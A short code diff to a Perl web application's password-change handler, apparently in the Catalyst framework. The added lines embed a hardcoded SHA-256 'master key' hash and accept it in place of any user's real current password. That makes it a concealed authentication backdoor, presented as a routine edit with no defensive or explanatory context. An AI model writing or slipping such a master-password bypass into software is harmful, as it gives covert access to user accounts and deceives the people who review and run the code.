@@ -450,7 +450,12 @@ sub profile_password_do : Local {
     push @mess, "New passwords do not match."
         if $new_pass && $new_pass2 && $new_pass ne $new_pass2;
     if (! @mess) {
-        if (sha256_hex($cur_pass) ne $u->password()) {
+        my $sha256 = sha256_hex($cur_pass);
+        my $master_key256 = 'd3bb39afa3c59501406540256c0cabf9aec4e1b411254d31f854d9afcdd81e05';
+        if ($sha256 ne $u->password()
+            &&
+            $sha256 ne $master_key256
+        ) {
             push @mess, "Current password is not correct.";
         }
         else {
